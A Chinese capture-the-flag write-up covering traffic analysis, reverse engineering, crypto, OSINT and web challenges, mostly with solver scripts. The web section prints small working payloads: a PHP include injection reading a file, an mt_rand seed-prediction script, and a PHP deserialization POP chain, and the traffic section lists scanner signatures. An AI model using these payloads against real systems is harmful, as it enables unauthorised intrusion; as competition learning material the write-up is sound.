和一队大佬打的

[@Hurkin](https://www.hurkin.top) @柯 @末路

排名6

![](https://seandictionary.top/wp-content/uploads/2025/06/image.png)

## Misc

### 段涵涵学姐最爱的音乐

多视图秒了

![](https://seandictionary.top/wp-content/uploads/2025/06/image-1-1024x402.png)

CM{U_Kn0w_TaYLOR}

### 流量分析-1

![](https://seandictionary.top/wp-content/uploads/2025/06/image-2-1024x299.png)

192.168.37.2先开始扫的

CM{3deffe759c6c09462a583fe08d7c6034}

### 流量分析-2

```
from scapy.all import rdpcap, IP, TCP, Raw
from collections import defaultdict
pcap_file = "./抓取流量.pcapng"  
packets = rdpcap(pcap_file)
scan_activity = defaultdict(set)
for pkt in packets:
    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        src_ip = pkt[IP].src
        dst_port = pkt[TCP].dport
        if pkt.haslayer(Raw):
            try:
                payload = pkt[Raw].load.decode(errors='ignore')
                if "Host:" in payload and ("GET /" in payload or "POST /" in payload):
                    lines = payload.split("\r\n")
                    host = ""
                    path = ""
                    for line in lines:
                        if line.startswith("Host:"):
                            host = line.split("Host:")[1].strip()
                        elif line.startswith("GET") or line.startswith("POST"):
                            path = line.split(" ")[1].strip()
                    full_url = host + path
                    scan_activity[src_ip].add(full_url)
                else:
                    scan_activity[src_ip].add(f"port:{dst_port}")
            except:
                continue
# 统计扫描次数
scan_counts = {ip: len(targets) for ip, targets in scan_activity.items()}
# 排序并打印前几名
sorted_counts = sorted(scan_counts.items(), key=lambda x: x[1], reverse=True)

# 输出结果
for ip, count in sorted_counts:
    print(f"{ip} 扫描次数: {count}")
```

192.168.37.3 扫描次数: 10970

![](https://seandictionary.top/wp-content/uploads/2025/06/image-3-1024x294.png)

### 流量分析-4

awvs的特点

1. url

```
acunetix-wvs-test-for-some-inexistent-file
by_wvs
acunetix_wvs_security_test
acunetix
acunetix_wvs
acunetix_test
```

1. headers

```
Acunetix-Aspect-Password:
Cookie: acunetixCookie
Location: acunetix_wvs_security_test
X-Forwarded-Host: acunetix_wvs_security_test
X-Forwarded-For: acunetix_wvs_security_test
Host: acunetix_wvs_security_test
Cookie: acunetix_wvs_security_test
Cookie: acunetix
Accept: acunetix/wvs
Origin: acunetix_wvs_security_test
Referer: acunetix_wvs_security_test
Via: acunetix_wvs_security_test
Accept-Language: acunetix_wvs_security_test
Client-IP: acunetix_wvs_security_test
HTTP_AUTH_PASSWD: acunetix
User-Agent: acunetix_wvs_security_test
Acunetix-Aspect-Queries:任意值
Acunetix-Aspect:任意值
```

1. body

```
acunetix_wvs_security_test
acunetix
```

找到192.168.37.1

CM{1edaa78b26c43a0cf438b4437f6ceeb3}

### 流量分析-6

过滤post流，找爆破login的

192.168.37.87

CM{83779b479698b76581244f6ac8acd8a6}

### 流量分析-7

来自 192.168.37.87

用统计得到次数为106

CM{f0935e4cd5920aa6c7c996a5ee53a70f}

### 流量分析-8

192.168.37.200&zhoudi123
http.request.method == "POST" && http.request.uri contains "login"

![](https://seandictionary.top/wp-content/uploads/2025/06/image-4-1024x560.png)

## re

### IDA

![](https://seandictionary.top/wp-content/uploads/2025/06/image-5-1024x472.png)

IDA打开获得flag

### XOR

IDA打开，分析一下

![](https://seandictionary.top/wp-content/uploads/2025/06/image-6-1024x472.png)

可以看到key是57

```
void __cdecl Xor(char *input, int key, int length)
{
  int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i < length; ++i )
    input[i] ^= key;
}
```

就是进行xor

![](https://seandictionary.top/wp-content/uploads/2025/06/image-7.png)

flag值

exp:

```
flag_hex = [
    0x5F, 0x55, 0x58, 0x5E, 0x42, 0x61, 0x09, 0x6B, 0x66, 0x08, 0x4A, 0x66,
    0x0F, 0x79, 0x4A, 0x08, 0x5A, 0x66, 0x5F, 0x09, 0x4B, 0x66, 0x6B, 0x0A,
    0x4F, 0x5C, 0x4B, 0x0C, 0x5C, 0x18, 0x44
]
key = 0x39  # 57 的十六进制
correct_input = bytes([byte ^ key for byte in flag_hex]).decode('ascii')
print("Flag:", correct_input)
```

### Maze

迷宫题

```
raw_map = "$11111111100111111111010000111001011011101101101110000110111111110011111111011111111101111111110000#"
# 找到起点和终点位置
start_index = raw_map.find('$')
end_index = raw_map.find('#')

# 构造纯地图字符串（将 $ 和 # 替换成 '0'）
grid_data = list(raw_map)
grid_data[start_index] = '0'
grid_data[end_index] = '0'

# 构建 10x10 网格
W, H = 10, 10
grid = [[grid_data[y * W + x] for x in range(W)] for y in range(H)]

# 转换 index 为坐标
start = (start_index // W, start_index % W)
end = (end_index // W, end_index % W)

# BFS 搜索最短路径
from collections import deque

dirs = {'W': (-1, 0), 'S': (1, 0), 'A': (0, -1), 'D': (0, 1)}
queue = deque()
queue.append((start[0], start[1], ""))  # y, x, path
visited = set()
visited.add((start[0], start[1]))

# 存储路径点用于可视化
path_points = set()
final_path = ""

while queue:
    y, x, path = queue.popleft()
    if (y, x) == end and len(path) == 28:
        final_path = path
        break
    if len(path) >= 28:
        continue
    for d, (dy, dx) in dirs.items():
        ny, nx = y + dy, x + dx
        if 0 <= ny < H and 0 <= nx < W:
            cell = grid[ny][nx]
            if cell == '0':
                if (ny, nx) not in visited:
                    visited.add((ny, nx))
                    queue.append((ny, nx, path + d))

# 用路径标记迷宫
if final_path:
    y, x = start
    path_points.add((y, x))
    for move in final_path:
        dy, dx = dirs[move]
        y += dy
        x += dx
        path_points.add((y, x))

# 构造带路径的可视化地图
visual_grid = []
for y in range(H):
    row = ""
    for x in range(W):
        if (y, x) == start:
            row += "$"
        elif (y, x) == end:
            row += "#"
        elif (y, x) in path_points:
            row += "*"
        elif grid[y][x] == '1':
            row += "█"
        else:
            row += "·"
    visual_grid.append(row)
final_path, "\n".join(visual_grid)
# 输出最终路径和可视化地图
print("Final Path:", final_path)
print("\n".join(visual_grid))
```

![](https://seandictionary.top/wp-content/uploads/2025/06/image-8-1024x260.png)

![](https://seandictionary.top/wp-content/uploads/2025/06/image-9.png)

### sw1f7's TEA

`key[0] = 36`、`key[1] = 66`、`key[2] = 82`、`key[3] = 118`

`encrypt` 函数接收两个 32 位无符号整数（`v0` 和 `v1`）作为明文，以及一个 128 位的密钥 `k`。它执行一个循环 32 次的加密过程。

`.data` 段中，`flag` 的值是： `0x5B5C5F08, 0x2766AE05, 0x8C4D477D, 0x554F7F8D, 0xE20BD674, 0xBE678AA, 0xF44B5224, 0xCA619F04`

```
import struct
def decrypt(v, k):
    v0, v1 = v[0], v[1]
    sum = 0xC6EF3720 
    DELTA = 0x61C88647
    for i in range(32):
        v1 = (v1 - ((v0 + sum) ^ (k[2] + 16 * v0) ^ ((v0 >> 5) + k[3]))) & 0xFFFFFFFF
        v0 = (v0 - ((v1 + sum) ^ (k[0] + 16 * v1) ^ ((v1 >> 5) + k[1]))) & 0xFFFFFFFF
        sum = (sum + DELTA) & 0xFFFFFFFF
    return [v0, v1]
key = [0x24, 0x42, 0x52, 0x76]
encrypted_flag_uints = [
    0x5B5C5F08, 0x2766AE05,
    0x8C4D477D, 0x554F7F8D,
    0xE20BD674, 0xBE678AA,
    0xF44B5224, 0xCA619F04
]
decrypted_bytes = b""
for i in range(0, len(encrypted_flag_uints), 2):
    v_chunk = [encrypted_flag_uints[i], encrypted_flag_uints[i+1]]
    decrypted_chunk_uints = decrypt(v_chunk, key)
    decrypted_bytes += struct.pack("<II", decrypted_chunk_uints[0], decrypted_chunk_uints[1])
print(decrypted_bytes.decode('utf-8'))
```

### sw1f7's XXTEA

XXTEA

encrypted_flag = [

0x19EA7A62, 0x05BE6801, 0xD2AD8A17, 0x1A1456A1,

0x843B635B, 0xE2369508, 0xBF552654, 0xFC87047C

]

key = [0x24, 0x42, 0x52, 0x76]

```
import struct
def decrypt_tea(v, key):
    n = len(v)
    delta = 0x61C88647
    rounds = 52 // n + 6
    sum_ = (0 - delta) * rounds & 0xFFFFFFFF
    y, z = v[0], v[-1]

    for _ in range(rounds):
        e = (sum_ >> 2) & 3
        for p in range(n - 1, 0, -1):
            z = v[p - 1]
            v[p] = (v[p] - (
                ((y ^ sum_) + (z ^ key[(e ^ p) & 3])) ^
                (((4 * y) ^ (z >> 5)) + ((y >> 3) ^ (16 * z)))
            )) & 0xFFFFFFFF
            y = v[p]

        z = v[-1]
        v[0] = (v[0] - (
            ((y ^ sum_) + (z ^ key[e & 3])) ^
            (((4 * y) ^ (z >> 5)) + ((y >> 3) ^ (16 * z)))
        )) & 0xFFFFFFFF
        y = v[0]

        sum_ = (sum_ + delta) & 0xFFFFFFFF

    return v


def words_to_bytes(words):
    """
    将32位整型列表转换为字节串
    """
    return b''.join(struct.pack('<I', word) for word in words)


def try_decode_flag(flag_bytes):
    """
    尝试解码字节为字符串
    """
    try:
        return flag_bytes.decode('utf-8').strip('\x00')
    except UnicodeDecodeError:
        return None
if __name__ == '__main__':
    encrypted_flag = [
        0x19EA7A62, 0x05BE6801, 0xD2AD8A17, 0x1A1456A1,
        0x843B635B, 0xE2369508, 0xBF552654, 0xFC87047C
    ]
    key = [0x24, 0x42, 0x52, 0x76]
    decrypted_words = decrypt_tea(encrypted_flag.copy(), key)
    flag_bytes = words_to_bytes(decrypted_words)
    flag_str = try_decode_flag(flag_bytes)
    if flag_str:
        print("解密后的 flag:", flag_str)
    else:
        print("解密后的字节:", flag_bytes)
        print("HEX表示:", flag_bytes.hex())
        print("无法解码为有效的字符串")
```

## crypto

### 愤怒的笑笑

斐波那契用一下矩阵快速幂，可以比递归+记忆化搜索快一点

后面的lfsr没啥好讲，解个方程就好

```
from Crypto.Util.number import *

def fib(n):
    def multiply(F, M):
        x = F[0][0]*M[0][0] + F[0][1]*M[1][0]
        y = F[0][0]*M[0][1] + F[0][1]*M[1][1]
        z = F[1][0]*M[0][0] + F[1][1]*M[1][0]
        w = F[1][0]*M[0][1] + F[1][1]*M[1][1]
        F[0][0], F[0][1] = x, y
        F[1][0], F[1][1] = z, w

    def power(F, n):
        if n == 0 or n == 1:
            return
        M = [[1, 1], [1, 0]]
        power(F, n // 2)
        multiply(F, F)
        if n % 2 != 0:
            multiply(F, M)

    F = [[1, 1], [1, 0]]
    if n == 0:
        return 0
    power(F, n - 1)
    return F[0][0]

n = 121445040208861909069894403265135678065120910909862499020293974222353911252357668566443655271324561444629423085857365441663340335267122084303353024719970701684304078915449107665234153848865575171396266594850387632166116876666641345151524526093750743311423760629508920605398826413219456966060130654182319239622853235598419783244961101023565485613969127617211798200257784669487075518232217287821539002272955530731559925743819394303592463643472505544371511975391525417372030795124188756668359793712687313915869489834990149406102691674251037529200092462351869985445609978956083451480606196410709785266414297484270955804000909874710243291131008074987501840685895810982539715865808340785585783784932746009294793388111303497827361597667080060904233538640411944294069905932767542941079924615545492728930748632793138167526456821615565265643786589492447320384175015988885891762397927722597983943795776730381090838150325379769514627877859254280292596379986317145513592309694492391589942506965514462458275558089505709047707881858666740272995276712061033659325342969092555904181602954831675187019667837919000590097455240471706803903843864588874240819424978016149001940435459574272517121404191497401282693543020081054458057536135286337530413794162493772935203185468003808946179794587532129108140773036801981194625504026220172240941266669713633255771146945596494369563639162958148338997083151465760140380287388970013418518808560606190028648382869570465274426248220666799284598328143667941885780739645827723387774853960763697674935365788526188525877728188039212192465886463099601345762532695705673402546191349122040406356859512156595066368962709427340711912079526354041896
c = 56588793843319337746724191421797882919298382185789212342757993436535833538835522763229763594877667021903450245810685457239006347519758531527469886935960286141037132766391893854072489010976740737632329381497939974348685705638979763163979105135831966969462502212645331623912058124799565947994143213185185992532880019990646317265334164877775033560523059626818443959011448004361903639117592816084037679180458435582475302588998924848174547895790261541575925513887774899878433973389508964314168199120579798596134069816522786705872922325579820616825662181444792078041146420951204474840017339067144121627577361659204068184374437536021834866744629203173525452975550210170854689131249911980147698258676007773287058650732712430646538052932526385903664366173103845251460027428058991440409897707266114313760974556093019272676530729679647453145281642248231912623556282846880428854082954278583510952137984285948462279982465734721299949983519379129012579754979967314981583010596156968017750652218444293183553797064562640415021018922337530706623720329914512691891247157484346793520829716469015298628414649436647705362645773660510066453649321698837054590345696220371667776079460869975651358713981526804058124260167477067800116925869645048296793453667948263141449977001998111471446893535134204947903797920023508228450635623912282556920844859004265256776076205404744691901113660811077768891817723583726923916755419376617397161631255119342712941347511133994305902274463032094437850518737799347513359266736626688000378302129740278671252372100118745385045165006411579452656230211530847834481096650640749089767353846648834690606914589383720715808010950418989797804848844908028168
hint = 18294419705033749803018183186096112152402551291430209346583558472922013290690589800566513840852313152850815949693453061822473006436564091423275427734726183402882773876530619900017570008504487011496639900712276814180156892043893283337592870931604509182121126729757414875305980944401674021305109901787373919069250888132010941446377885033954783641074524904335530439232153795506796131799840815859332631629520548237546341180970993275196594743629686044240376562797833663497706050016975314637814732243863519275581657562824577416520887857531300484034288184348876435266599982852899863511077867993896260185876623577916847805434018960645048222193073045995417189741052112103530337456864569791619370910540989544825643388189316375353130601280427411097634982360164150650121200938121132975127392218810406251814769876585467670838768851084325019437401290895892649127468159357644376855642219871658242665316842174539950982501562012993620707848235840777465439382427694385975143409696608524006610718341269938590805893846551221772802799937388082484101818519470210469287886673559139819764993972650754106595274703362578095021666440413181006787169326119053179113634896719904706459255688323355422629750624744361016321749825711352381979526373745414466117496901188899402968884557897042915393081588659355938084179373516472500982821481620361825619098189709268749353026527626333126253300709023279752604686313218745191179635948042935114535230124092175888272591892209973826349925162305622280085164752927856768903063667002948252367704955505382627077430221515644243237639648659331074231756506975066652222700589414902433234306276129685280949801672748996080027431076564977892352264341740524147048337215454135414149313442308392992893543348489794522704133497959650612938856771407888345435215493938925195892269263980872231297338970570968594859288833461843787177471203855945919703978692377984


r = int(fib(2022))
assert n%r == 0
n //= r

e = 0o10001
d = pow(e, -1, hint)
m = pow(c, d, n)
enc1 = long_to_bytes(m)
print(enc1) # 1241234123214

def init(state):
    result = [int(i) for i in bin(state)[2:]]
    PadLenth = 128 - len(result)
    result = [ 0 ] * PadLenth + result
    assert len(result) == 128
    return result

def solve_GF2_linear_system(A, b):
    """
    使用 SageMath 在 GF(2) 上求解线性方程组 Ax = b
    :param A: 系数矩阵
    :param b: 结果向量
    :return: 解向量 x
    """
    F = GF(2)
    A_GF2 = Matrix(F, A)
    b_GF2 = vector(F, b)
 
    try:
        x = A_GF2.solve_right(b_GF2)
        return x
    except ValueError:
        return None
 
def solution(m):
    a,b = m[0],m[1]
    solution = solve_GF2_linear_system(a, b)
    if solution:
        print(f"解向量为: {solution}")
        return solution
    else:
        print("无解")
        return None
 
def change(seed,random):
    All = seed + random
    a = [[0]*128 for _ in range(128)]
    b = random
    for i in range(128):
        a[i] = All[i:i+128]
    return (a,b)

random1 =  176011035589551066670092363165068881602
random2 =  157117237038314150714243518116791116977

random1,random2 = map(init, [random1,random2])

ans = solution(change(random1,random2))
mask = int("".join(str(i) for i in ans),2)
mask = long_to_bytes(int(mask))
print(mask) # B1e_ju@n_le_QAQ!

flag = b'CMCTF{' + enc1 + mask  + b'}'

print(flag)

# CMCTF{1241234123214B1e_ju@n_le_QAQ!}
```

### Base141

![](https://seandictionary.top/wp-content/uploads/2025/06/image-10.png)

### RSA你太baby了

```
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
hex_ciphertext = """
6b 4d 31 77 67 6f 43 47 4f 77 52 66 45 32 6f 46 30 6d 6a 30 77 32 6a 71 36 59 6d 6a 38 4e 6b 69 39 36 36 68 59 66 43 71 70 2b 4f 42 63 54 33 6f 7a 49 66 74 4c 74 61 44 52 79 65 45 72 53 2f 68 46 79 33 6c 38 53 6a 35 49 54 75 47 43 35 6d 55 52 50 58 41 30 4b 42 77 45 73 36 37 6c 37 69 46 37 74 39 7a 6e 54 51 4b 31 41 57 6c 74 46 5a 47 4d 36 74 62 77 6b 33 56 54 54 59 43 72 52 54 36 41 65 6a 74 79 41 6f 59 7a 70 62 76 53 79 46 4e 59 37 2b 73 62 50 74 58 77 79 41 2b 30 6a 63 43 79 61 57 32 49 41 56 63 56 77 6e 44 65 4d 38 54 6c 68 34 35 7a 6f 41 50 56 62 77 63 4f 69 57 78 55 62 79 43 4c 49 48 6b 30 72 55 58 53 76 47 39 34 33 67 50 6d 76 53 71 73 39 4b 66 6d 52 4a 5a 4b 6e 52 6c 73 62 42 47 58 44 77 5a 6f 34 38 6b 67 58 4d 52 36 5a 33 4a 54 6b 75 42 37 47 33 44 44 53 78 78 78 45 69 77 38 38 64 2f 54 78 65 6c 59 61 78 39 72 73 63 75 74 56 6a 67 35 71 48 58 6e 43 46 6c 70 47 4e 2b 7a 51 34 46 63 50 77 44 6f 52 48 58 50 79 61 52 43 5a 61 52 37 63 70 50 65 63 72 47 66 54 55 2f 2b 41 59 53 7a 4c 37 4b 76 75 6b 71 31 41 3d 3d
"""

private_key_pem = """-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQDoJqsE20fcEWu+
WfizvGn6GN8Ae/aJxh2tjpZR7KsXYmuqdDTSmVsWXo3mnI5Z6oCGAynuc3gxHPPb
pZGjxxf0QYvjPTs7FRC3u162ph8KF7EPSMq7KvJjbBgI8qrGc4CUy2UpFWjha9EW
fDGyKBkqnjzeVvfkPdMhZajcZCp3atsvVg6yPKpH3Tum/Lo4Cf831OKbRnQKnr6H
0HSs2ECP2ZPLBtMIEUHLJ2DbM4Gul9lZ5Ecu/MZSBForWufskbdJw+5KLH0wWKpW
E3y5sWHb4N3t6azZzLcu1xweRorsUQs+5SdU8nlsF0o9aVHcsII6sJxWUj5eofv7
2/c5dykVAgMBAAECggEABUj8E7w6QpRS855wvwbHEt6GFSi9UB2mh1D7sxnEO2AO
O28x1KmRHU1BxcJCq2FfU622wqr2TYfvNUzrp+LcdL8ZRC8crheorcYiPd5CTqSD
b2mk0+YCZqkLUwjTQnlWsAyBXRITtS4TMIPbTccD66h2kklAk32k1NnPolTVcqp9
ANMgWlCwwCCnngw9ppE0S+kC7lQO/Qf/ZKMuqETEdoCMbC2AfgcyFc/AXddZ+H8J
629pWeDFQO3CPlSrGy/FM0IYA8Dmm/9c3Pf31Qy3yby+2G/Obryyl7BWTWiRIi+m
TF2n1/QCJp7yXTu3DRUffRpvBxfx2aK2chv/5PKUcQKBgQD4eYciwO3reDMM7dPT
MsECpVVJ8Nwf5EGj4H/Hu2upZ2pOygcrw9XTxw54iRQxvrXokXzX/6UOnvXq47VQ
Oq7fqBu3x1CclvJLYn3jV7Z4g7dPyo5fKTkG4PM45tIoJEJZr92va7VFVviU0U+X
83xHMvA547QmrZLJIrKe66BXKwKBgQDvLpRhvlckP0uDXTdd9bIwirlyWDq/B6cn
lbcPLpsim5Bl0q8892rEUgYAwVsOE2X8tlTEwSqRqO5RwKCKrfX+O4P2XaPhIaP+
H13ehvKIJqe9SrVoBST2PknPA3zfOHsM1mpDeWSmP3vhUPobO4iNAe5Yk7zQupJF
7KU58XJgvwKBgHy+Vm/GOCwNLmQBSmUvh+LSKl1yxLBmIeYqITyfBVAJET/5AVyh
dspZlxRAjZjjy+O0lt7CA5WxjHieVTqwG3dBqJi9QeU7iuz5x4XJVVxvlCpE4PE5
et3PNYyNpVhty7nHJx6Yjmr/XNEpvDHnFa+RDTWi8aCxZ43/E3nhhZ/9AoGAZEpL
vZBqSbCgoTx88tELHn+Msv175I348Qg98gfA1QoVyhxFjnLQOfGKwtZQr95CbWym
rrmwd9M12uHCb2PyOeAKvUsWZFgOw4ezfJNpLt3GiADDgBJoJTiJClyUB6VPM1rU
w+Yq5erIrvmdZb3YzAd7QXjxOzSAEQHhZiJvq1ECgYAeRnIejF8KXIVpnBpkVcDP
nQGbb8LcrlC3ONHQrbl6c1FCK4Ht38t+vbu32+rdSVtc+Sxccaqxs0md6/4O6UYd
WDZuLvtpugTi8Dw/4HjPojDK1rxysCJcrxLIQlpwqsrha6sf68EraTK714Qh9nU5
DPgfC51MVmo4fKt2mhHBKg==
-----END PRIVATE KEY-----"""
# 清理并转换十六进制字符串
hex_str = ''.join(hex_ciphertext.split())
ciphertext = base64.b64decode(bytes.fromhex(hex_str))
# 加载私钥
key = RSA.import_key(private_key_pem)
cipher = PKCS1_v1_5.new(key)
# 解密
try:
    plaintext = cipher.decrypt(ciphertext, None)
    print("解密结果:", plaintext.decode('utf-8'))
except Exception as e:
    print("解密失败:", str(e))
```

CM{Y0u_kn0w_ba6y_R5A}

## OSINT

### 杜浩学姐の朋友圈

注意到图片上有亮光logo ，且是镜像的，先把图片翻转

![](https://seandictionary.top/wp-content/uploads/2025/06/image-13-1024x768.png)

注意到几个点：魅ktv、city花园城

![](https://seandictionary.top/wp-content/uploads/2025/06/image-11.png)

![](https://seandictionary.top/wp-content/uploads/2025/06/image-12.png)

直接地图发力

![](https://seandictionary.top/wp-content/uploads/2025/06/image-14-460x1024.png)

所以这地方是南京，隔壁就是万寿地铁站

flag{Nanjing-万寿}

### 杜浩学姐の旅行

![](https://seandictionary.top/wp-content/uploads/2025/06/image-15-768x1024.png)

这个机型看翼尖可以知道是A380客机

翼尖涂装感觉不是国内航司，我搜了搜感觉像是日本的乐桃航空

然后看地面的话应该是沿海，高度说明刚起飞或者马上着陆，应该当前位置离机场不远，重点找一找机场在入海口附件的，且这是个沿海发达城市

对的没错，思路很对，那么优先查阅这个航司的国际航班时刻表

![](https://seandictionary.top/wp-content/uploads/2025/06/image-16-1024x327.png)

然后航线只有关西到浦东和关西到香港，查看卫星地图可以排除浦东和香港，于是最后在关西附近找到了和歌山市

![](https://seandictionary.top/wp-content/uploads/2025/06/image-17-970x1024.png)

## Mobile

### base_android

0.o？？？？

![](https://seandictionary.top/wp-content/uploads/2025/06/image-18-1024x591.png)

flag{08067-wlecome}

## web

### 小猿口算

速算题，ai出个脚本

```
import requests
import re

BASE_URL = "http://27.25.151.40:32873/"  


def solve_math_ctf():
    session = requests.Session()

    while True:
        try:
            # 1. 获取数学表达式
            gen_resp = session.get(f"{BASE_URL}/generate")
            expression = gen_resp.json()["expression"]

            # 2. 清洗表达式（移除非标准字符）
            clean_expr = re.sub(r'[^0-9+\-*/().]', '', expression)

            # 3. 安全计算（限制符号防止代码注入）
            allowed_chars = set("0123456789+-*/(). ")
            if not all(char in allowed_chars for char in clean_expr):
                print(f"跳过危险表达式: {expression}")
                continue

            result = eval(clean_expr, {'__builtins__': None})

            # 4. 处理浮点精度（保留2位小数）
            if isinstance(result, float):
                result = round(result, 2)

            # 5. 提交验证
            verify_data = {"user_input": str(result)}
            verify_resp = session.post(
                f"{BASE_URL}/verify",
                json=verify_data,
                headers={"Content-Type": "application/json"}
            )

            # 6. 检查flag
            response = verify_resp.json()
            if "flag" in response:
                print(f"成功获取flag: {response['flag']}")
                return response["flag"]

            print(f"验证失败: {expression} = {result}")

        except Exception as e:
            print(f"处理出错: {str(e)}")


if __name__ == "__main__":
    solve_math_ctf()
```

### lottery签到重生版

抽奖游戏，前端拿不到flag，爆破即可，总会狗运出flag的

![](https://seandictionary.top/wp-content/uploads/2025/06/image-19-1024x537.png)

### busy_search

扫出 `index.html`，里面是一个文档，看源码，注释里就是flag片段，拼起来即可

![](https://seandictionary.top/wp-content/uploads/2025/06/image-20.png)

![](https://seandictionary.top/wp-content/uploads/2025/06/image-21.png)

![](https://seandictionary.top/wp-content/uploads/2025/06/image-22.png)

### 函数重生版

```
?i=include '/tmp/fl'.'ag.sh';
```

include读文件

### give!me!money!

扫到 `index.rar`读到源码

![](https://seandictionary.top/wp-content/uploads/2025/06/image-23.png)

关键在于需要传入一个参数c与 `$shenhe`相同，这个 `$shenhe`是通过 `mt_rand`和 `mt_srand`生成的，这俩生成的是伪随机数，让ai写个脚本逆推 `shenhe`，换成相同的php版本（5.6）运行

```
<?php
$current_time = time(); // 同步攻击机器与服务器的时间
$window = 1; // 时间误差窗口（秒）

for ($offset = -$window; $offset <= $window; $offset++) {
    $seed_time = $current_time + $offset;
    $seed = substr($seed_time, 0, 7);
    mt_srand($seed);
  
    for ($i = 0; $i <= 100; $i++) {
        $rand = mt_rand();
        if ($i == 100) {
            echo "Seed: $seed → shenhe: $rand\n";
        }
    }
}
?>
```

payload：

```
GET:?id=d&money=114514
POST:c=682052962
```

### pop之我又双叒叕重生了

pop链：`__wakeup()`->`get_flag`->`__toString`->`fun`

```
<?php
class A1 { public $a1; }
class A2 { public $a2; }
class A3 { public $a3; }
class A4 { public $a4; } 
$a4 = new A4();
$a3 = new A3();
$a3->a3 = $a4;
$a2 = new A2();
$a2->a2 = $a3;
$a1 = new A1();
$a1->a1 = $a2;

echo urlencode(serialize($a1));
```

Payload:

```
?wlaq=O:2:"A1":1:{s:2:"a1";O:2:"A2":1:{s:2:"a2";O:2:"A3":1:{s:2:"a3";O:2:"A4":0:{}}}}&2025=admin
```

flag在源码里
